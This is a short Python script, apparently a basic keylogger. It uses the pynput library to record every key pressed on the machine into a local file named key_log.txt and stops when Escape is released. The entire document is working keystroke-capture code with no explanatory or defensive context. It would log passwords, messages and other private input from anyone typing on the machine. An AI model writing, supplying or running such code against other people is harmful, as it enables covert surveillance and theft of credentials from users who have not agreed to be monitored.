from pynput.keyboard import Key, Listener

# File to store logged keys
log_file = "key_log.txt"

# Function to write keys to the log file
def write_to_file(key):
    with open(log_file, "a") as f:
        # Clean up the key format
        if hasattr(key, 'char') and key.char is not None:
            f.write(key.char)
        elif key == Key.space:
            f.write(" ")
        elif key == Key.enter:
            f.write("\n")
        elif key == Key.backspace:
            f.write("[BACKSPACE]")
        else:
            f.write(f"[{key.name}]")

# Function to handle key press
def on_press(key):
    write_to_file(key)

# Function to stop the listener
def on_release(key):
    if key == Key.esc:  # Press Escape to stop the logger
        return False

# Set up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
